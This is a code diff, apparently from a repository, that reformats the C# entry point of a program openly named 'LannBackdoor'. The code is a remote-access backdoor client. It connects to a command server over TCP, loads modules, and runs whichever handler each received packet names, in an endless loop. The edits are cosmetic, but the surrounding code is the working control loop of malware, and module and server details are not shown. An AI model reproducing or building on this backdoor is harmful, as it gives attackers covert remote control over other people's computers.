@@ -11,24 +11,24 @@ using Constants = LannConstants.Constants;
 namespace LannBackdoor;
 
 public static class LannBackdoor {
-    private static readonly Logger Logger = LoggerFactory.CreateLogger("LannBackdoor");
-    private static TCPClient _tcpClient = null!;
-    private static int _serverId;
+    private static readonly Logger    Logger     = LoggerFactory.CreateLogger("LannBackdoor");
+    private static          TCPClient _tcpClient = null!;
+    private static          int       _serverId;
 
     public static async Task Main() {
         Console.OutputEncoding = System.Text.Encoding.UTF8;
-        
-        if(Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
+
+        if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
         Logger.Information("Ohayou, ばか!");
         Logger.Information("Config:\n  - Debug: {Debug}\n  - Url: {URL}\n  - Port: {Port}",
-            Constants.Debug,
-            Utils.CreateUrl(_serverId),
-            Constants.Port);
+                           Constants.Debug,
+                           Utils.CreateUrl(_serverId),
+                           Constants.Port);
 
         ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
         await Connect();
 
-        while (true) { await Task.Delay(1000); }
+        while (true) await Task.Delay(1000);
     }
 
     private static async Task Connect() {
@@ -43,9 +43,9 @@ public static class LannBackdoor {
         _tcpClient.OnCommand += async (_, data) => {
             Packet packet = data.Packet;
             Logger.Debug("Packet received: {Module}/{Handler}: {@Data}",
-                packet.ModuleId,
-                packet.HandlerId,
-                packet.GetData<object>());
+                         packet.ModuleId,
+                         packet.HandlerId,
+                         packet.GetData<object>());
 
             ModuleInfo? module = ModuleRegistry.Get(packet.ModuleId);
             if (module == null) {
@@ -62,8 +62,8 @@ public static class LannBackdoor {
             HandlerInfo? handler = module.GetHandler(packet.HandlerId);
             if (handler == null) {
                 Logger.Debug("Unknown handler: {Module}/{Id}",
-                    packet.ModuleId,
-                    packet.HandlerId);
+                             packet.ModuleId,
+                             packet.HandlerId);
                 return;
             }
 
@@ -72,9 +72,9 @@ public static class LannBackdoor {
                 await handler.Execute(_tcpClient, packet.GetData<object>(type));
             } catch (Exception e) {
                 Logger.Error("Handler {Module}/{Handler} invocation failed: {Error}",
-                    packet.ModuleId,
-                    packet.HandlerId,
-                    e.Message);
+                             packet.ModuleId,
+                             packet.HandlerId,
+                             e.Message);
             }
         };
 
